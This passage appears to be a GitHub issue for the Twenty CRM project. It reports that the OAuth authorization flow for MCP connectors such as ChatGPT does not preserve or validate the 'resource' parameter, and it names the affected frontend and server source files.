- `GET https://api.twenty.com/.well-known/oauth-authorization-server` returns OAuth discovery metadata with:
  - `authorization_endpoint: https://app.twenty.com/authorize`
  - `token_endpoint: https://api.twenty.com/oauth/token`
  - `registration_endpoint: https://api.twenty.com/oauth/register`
  - `code_challenge_methods_supported: ["S256"]`
- Dynamic client registration succeeds with `201` when posting to `https://api.twenty.com/oauth/register`.
- The generated `https://app.twenty.com/authorize?...` URL serves the Twenty frontend.

## Suspected issue

This may be an MCP OAuth compatibility issue around the OAuth `resource` parameter.

In the current code, the authorize page parses `client_id`, `code_challenge`, `redirect_uri`, and `state`, but does not preserve `resource`:

- `packages/twenty-front/src/pages/auth/Authorize.tsx`

The authorization code context stores redirect URI, client id, scope, and PKCE challenge, but not the requested resource:

- `packages/twenty-server/src/engine/core-modules/auth/services/auth.service.ts`

The token endpoint input/exchange path also does not accept or validate a `resource` parameter:

- `packages/twenty-server/src/engine/core-modules/application/application-oauth/dtos/oauth-token.input.ts`
- `packages/twenty-server/src/engine/core-modules/application/application-oauth/controllers/oauth-token.controller.ts`
- `packages/twenty-server/src/engine/core-modules/application/application-oauth/oauth.service.ts`

If ChatGPT sends `resource=https://api.twenty.com/mcp` during authorization/token exchange, Twenty may need to preserve and validate that value through the OAuth flow.

## Notes

A local patch was briefly tested to pass `resource` from `/authorize` into the authorization-code context and validate it during token exchange, but it was reverted pending issue tracking and review.
